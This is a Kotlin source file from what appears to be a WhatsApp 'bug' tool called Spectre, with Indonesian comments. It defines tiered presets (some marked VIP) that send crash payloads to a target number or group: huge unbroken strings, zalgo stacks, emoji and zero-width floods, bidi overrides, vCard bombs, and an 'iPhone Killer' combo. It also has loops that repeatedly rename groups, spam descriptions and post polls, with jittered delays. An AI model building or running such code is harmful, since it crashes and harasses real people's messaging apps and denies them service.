package id.spectre.bugs.bug

import id.spectre.bugs.wa.WaBridge
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext

enum class Tier(val label: String) { S("S"), SS("SS"), SSS("SSS"), VIP("VIP") }

enum class Preset(val title: String, val desc: String, val tier: Tier) {
    CRASH_CORE("Crash Core", "String 120.000 char tanpa spasi. Renderer freeze, bubble mati.", Tier.SS),
    ZALGO_ABYSS("Zalgo Abyss", "Stack combining mark depth 14. Font shaping kolaps.", Tier.SSS),
    EMOJI_FLOOD("Emoji Flood", "6.000 emoji satu pesan. Bitmap cache jebol.", Tier.SS),
    INVISIBLE_DELAY("Invisible Delay", "Zero-width 80.000 + jitter. Tampak kosong, berat senyap.", Tier.SSS),
    BIDI_MELTDOWN("Bidi Meltdown", "Override RTL/LTR 6.000 pasang. Arah teks ngaco total.", Tier.SS),
    FORMAT_NEST("Format Nest", "Nesting * _ ~ ``` 4.000 lapis. Parser markdown WA ngos-ngosan.", Tier.S),
    NEWLINE_CANYON("Newline Canyon", "12.000 baris kosong. Layout melar.", Tier.S),
    VCARD_BOMB("VCard Bomb", "800 kontak dalam satu pesan.", Tier.SS),
    MENTION_APOCALYPSE("Mention Apocalypse", "Mention massal + teks berat (khusus grup).", Tier.VIP),
    IPHONE_KILLER("iPhone Killer", "90k char + zalgo + emoji + invisible, multi-tembak.", Tier.VIP),
    SPECTRE_FULL("Spectre Full Auto", "Semua preset dijalankan berurutan. Total annihilation.", Tier.VIP)
}

class BugEngine(private val bridge: WaBridge) {

    suspend fun run(
        target: String,
        preset: Preset,
        delayMode: Boolean,
        mentionJids: List<String> = emptyList(),
        log: (String) -> Unit
    ) = withContext(Dispatchers.IO) {
        val plan = buildPlan(preset, mentionJids)
        log(">> ${preset.title} | ${plan.size} pesan | target $target")

        plan.forEachIndexed { i, msg ->
            if (delayMode) delay(Payloads.jitter(35, 240))
            bridge.send(target, msg.first, msg.second)
            log("[${i + 1}/${plan.size}] ${msg.first.length} char | terkirim")
        }
        log("<< ${preset.title} selesai")
    }

    private fun buildPlan(p: Preset, jids: List<String>): List<Pair<String, List<String>>> =
        when (p) {
            Preset.CRASH_CORE -> listOf(Payloads.hugeLine(120_000) to emptyList())
            Preset.ZALGO_ABYSS -> listOf(Payloads.zalgo("SPECTRE", 14) to emptyList())
            Preset.EMOJI_FLOOD -> listOf(Payloads.emojiStack(6_000) to emptyList())
            Preset.INVISIBLE_DELAY -> List(6) { Payloads.invisible(14_000) to emptyList() }
            Preset.BIDI_MELTDOWN -> listOf(Payloads.bidi(6_000) to emptyList())
            Preset.FORMAT_NEST -> listOf(Payloads.fmtNest(4_000) to emptyList())
            Preset.NEWLINE_CANYON -> listOf(Payloads.newlineCanyon(12_000) to emptyList())
            Preset.VCARD_BOMB -> listOf(Payloads.vcardBomb(800) to emptyList())
            Preset.MENTION_APOCALYPSE -> {
                val (body, m) = Payloads.mentionBomb(Payloads.hugeLine(8_000), jids)
                listOf(body to m)
            }
            Preset.IPHONE_KILLER -> listOf(
                Payloads.hugeLine(90_000) to emptyList(),
                Payloads.zalgo("SPECTRE KILLER", 12) to emptyList(),
                Payloads.emojiStack(3_500) to emptyList(),
                Payloads.invisible(40_000) to emptyList(),
                Payloads.bidi(3_000) to emptyList()
            )
            Preset.SPECTRE_FULL -> Preset.entries
                .filter { it != Preset.SPECTRE_FULL && it != Preset.MENTION_APOCALYPSE }
                .flatMap { buildPlan(it, jids) }
        }

    suspend fun floodGroupName(jid: String, rounds: Int, log: (String) -> Unit) =
        withContext(Dispatchers.IO) {
            repeat(rounds) { i ->
                bridge.groupUpdate(jid, "subject", "SPECTRE ${Payloads.hugeLine(300)}$i")
                delay(Payloads.jitter(60, 200))
                log("rename ${i + 1}/$rounds")
            }
        }

    suspend fun floodGroupDesc(jid: String, rounds: Int, log: (String) -> Unit) =
        withContext(Dispatchers.IO) {
            repeat(rounds) { i ->
                bridge.groupUpdate(jid, "desc", Payloads.zalgo("SPECTRE", 8) + Payloads.invisible(4_000))
                delay(Payloads.jitter(60, 200))
                log("desc ${i + 1}/$rounds")
            }
        }

    suspend fun pollBomb(jid: String, rounds: Int, log: (String) -> Unit) =
        withContext(Dispatchers.IO) {
            repeat(rounds) { i ->
                bridge.poll(jid, "SPECTRE POLL", List(12) { "Opsi ${it + 1}" })
                delay(Payloads.jitter(80, 260))
                log("poll ${i + 1}/$rounds")
            }
        }
}
